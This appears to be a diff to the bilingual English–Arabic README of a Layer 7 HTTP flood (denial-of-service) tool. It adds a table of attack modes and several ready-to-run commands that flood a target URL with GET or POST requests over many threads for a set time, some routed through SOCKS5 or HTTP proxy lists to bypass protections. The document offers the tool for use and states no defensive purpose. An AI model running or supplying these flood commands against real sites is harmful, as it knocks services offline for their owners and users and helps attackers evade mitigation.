@@ -42,17 +42,42 @@ pip3 install -r requirements.txt
 
 ---
 
-## 🚦 Usage (Layer 7 Attack) | طريقة التشغيل
+## Usage | طريقة التشغيل
+
+### Available Attack Modes | أوضاع الهجوم المتاحة:
+
+| Mode        | Description (EN)                       | الوصف (عربي)                             |
+|-------------|--------------------------------------|-----------------------------------------|
+| GET         | Simple GET attack without proxy      | هجوم GET بسيط بدون استخدام بروكسي      |
+| POST        | POST attack without proxy with data  | هجوم POST بدون بروكسي مع بيانات         |
+| bypass      | Layer 7 bypass attack with proxies   | هجوم تجاوز طبقة 7 باستخدام البروكسي     |
+| proxy_get   | GET attack with proxies               | هجوم GET باستخدام البروكسيات             |
+| proxy_post  | POST attack with proxies and data    | هجوم POST باستخدام البروكسيات مع بيانات  |
+
+---
+
+### Usage Examples | أمثلة التشغيل:
 
 ```bash
-# Example: Bypass attack with 100 threads and SOCKS5 proxies
-# مثال: هجوم Bypass بـ 100 خيط وبروكسي SOCKS5
+# Simple GET attack for 60 seconds with 100 threads
+python3 core/runner.py GET https://example.com 60 100
+
+# POST attack for 60 seconds with 100 threads and POST data
+python3 core/runner.py POST https://example.com 60 100 "" "param1=value1&param2=value2"
+
+# Bypass attack with 60 seconds, 100 threads, using SOCKS5 proxies file
 python3 core/runner.py bypass https://example.com 60 100 proxy/socks5.txt
+
+# GET attack with 60 seconds, 100 threads, using HTTP proxies file
+python3 core/runner.py proxy_get https://example.com 60 100 proxy/http.txt
+
+# POST attack with 60 seconds, 100 threads, using HTTP proxies file and POST data
+python3 core/runner.py proxy_post https://example.com 60 100 proxy/http.txt "param1=value1&param2=value2"
 ```
 
 ---
 
-## 🌍 Web Interface (soon) | واجهة الويب (قريبًا)
+## 🌍 Web Interface  | واجهة الويب 
 
 ```bash
 uvicorn web.app:app --host 0.0.0.0 --port 8000 --reload
